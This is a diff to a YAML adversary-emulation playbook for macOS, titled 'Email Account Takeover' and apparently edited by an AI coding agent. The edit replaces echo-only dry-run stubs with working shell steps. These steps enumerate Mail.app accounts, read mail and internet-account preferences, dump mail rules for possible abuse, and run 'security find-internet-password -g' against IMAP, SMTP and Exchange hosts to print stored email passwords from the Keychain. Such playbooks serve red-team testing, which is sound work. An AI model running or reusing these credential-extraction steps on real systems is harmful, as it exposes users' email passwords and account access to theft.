@@ -5,7 +5,9 @@ name: Email Account Takeover
 authors:
 - Claude Code
 description: |
-  Gain access to macOS systems through compromised email account takeover
+  Enumerate and extract email account configuration and credentials from a macOS system.
+  Examines Mail.app account data, reads mail preferences, queries the Keychain for
+  IMAP/SMTP passwords, and lists configured mail rules that could be abused.
 mitre:
   tactics:
   - TA0001 Initial Access
@@ -14,52 +16,79 @@ mitre:
 requirements:
   platforms:
   - os: darwin
-args:
-- name: target_account
-  description: Target email account or username
-  type: string
-- name: password_list
-  description: Path to password list for email account attacks
-  type: string
-- name: leaked_creds_file
-  description: Path to file with leaked email credentials
-  type: string
-- name: oauth_token
-  description: OAuth token from compromised email account
-  type: string
 steps:
-- name: load_email_credentials
-  description: Load leaked email account credentials
+- name: enumerate_mail_accounts
+  description: Enumerate configured email accounts from Mail.app data
   inline: |
-    echo "Loading leaked email credentials for: ${target_account}"
-    if [ -f "${leaked_creds_file}" ]; then
-      wc -l < "${leaked_creds_file}" | xargs echo "Email credentials loaded:"
+    echo "=== Enumerating Mail.app Accounts ==="
+    mail_dir="$HOME/Library/Mail"
+    if [ -d "$mail_dir" ]; then
+      echo "Mail.app data directory found: $mail_dir"
+      ls -la "$mail_dir"/ 2>/dev/null
+      echo "--- Mail Account Directories ---"
+      find "$mail_dir" -maxdepth 2 -type d -name "*.imapmbox" -o -name "*.mbox" 2>/dev/null | head -20
+      echo "--- Account info plists ---"
+      find "$mail_dir" -name "AccountInfo.plist" -o -name "Info.plist" 2>/dev/null | head -10 | while read -r plist; do
+        echo "Found: $plist"
+        plutil -p "$plist" 2>/dev/null | head -20 || true
+      done
+    else
+      echo "Mail.app data directory not found"
     fi
-- name: attempt_email_authentication
-  description: Attempt authentication to email account
+- name: extract_mail_configuration
+  description: Extract mail configuration from system defaults
   inline: |
-    echo "Attempting email account authentication"
-    if [ -f "${password_list}" ]; then
-      # Dry run: simulate email authentication
-      echo "Testing email credentials"
+    echo "=== Extracting Mail.app Configuration ==="
+    echo "--- Mail Preferences ---"
+    defaults read com.apple.mail 2>/dev/null | head -80 || echo "Could not read Mail preferences"
+    echo ""
+    echo "--- Mail Account Configuration ---"
+    defaults read com.apple.mail MailAccounts 2>/dev/null | head -60 || echo "No MailAccounts found"
+    echo ""
+    echo "--- Internet Accounts ---"
+    defaults read com.apple.internetaccounts 2>/dev/null | head -60 || echo "Could not read Internet Accounts"
+- name: search_keychain_email_passwords
+  description: Search the Keychain for stored email (IMAP/SMTP) passwords
+  inline: |
+    echo "=== Searching Keychain for Email Credentials ==="
+    echo "--- IMAP Passwords ---"
+    security find-internet-password -s "imap" -g 2>&1 || true
+    security find-internet-password -s "imap.gmail.com" -g 2>&1 || true
+    security find-internet-password -s "imap.mail.me.com" -g 2>&1 || true
+    security find-internet-password -s "outlook.office365.com" -g 2>&1 || true
+    echo "--- SMTP Passwords ---"
+    security find-internet-password -s "smtp" -g 2>&1 || true
+    security find-internet-password -s "smtp.gmail.com" -g 2>&1 || true
+    security find-internet-password -s "smtp.mail.me.com" -g 2>&1 || true
+    echo "--- Exchange/ActiveSync ---"
+    security find-internet-password -s "outlook" -g 2>&1 || true
+    security find-internet-password -s "exchange" -g 2>&1 || true
+    echo "--- Generic mail entries ---"
+    security find-generic-password -s "com.apple.account.IMAP" 2>&1 || true
+    security find-generic-password -s "com.apple.account.SMTP" 2>&1 || true
+- name: list_mail_rules
+  description: List configured email rules that could be leveraged for persistence or data access
+  inline: |
+    echo "=== Listing Mail Rules ==="
+    rules_plist="$HOME/Library/Mail/V*/MailData/SyncedRules.plist"
+    for f in $rules_plist; do
+      if [ -f "$f" ]; then
+        echo "Found rules file: $f"
+        plutil -p "$f" 2>/dev/null | head -50 || true
+      fi
+    done
+    # Also check for rules via defaults
+    defaults read com.apple.mail RulesOfType 2>/dev/null | head -30 || echo "No mail rules found via defaults"
+    # Check for mail downloads directory
+    echo "--- Mail Downloads ---"
+    mail_downloads="$HOME/Library/Containers/com.apple.mail/Data/Library/Mail Downloads"
+    if [ -d "$mail_downloads" ]; then
+      echo "Mail Downloads directory exists:"
+      ls -la "$mail_downloads" 2>/dev/null | head -20
     fi
-- name: exploit_account_recovery
-  description: Use email account to reset macOS account password
-  inline: |
-    echo "Attempting to use email account for password reset"
-    # Dry run: simulate password reset process
-    echo "Email-based account recovery attempted"
-- name: access_system
-  description: Gain system access using recovered account
-  inline: |
-    echo "Attempting system access via email recovery"
-    # Dry run simulation
-    exit 0
   cleanup:
     inline: |
-      echo "Revoking email OAuth tokens and sessions"
-
-      echo "Resetting email and system account passwords"
+      echo "Email account enumeration complete. No temporary files to clean up."
 tests:
 - name: dry_run_test
   dry_run: true
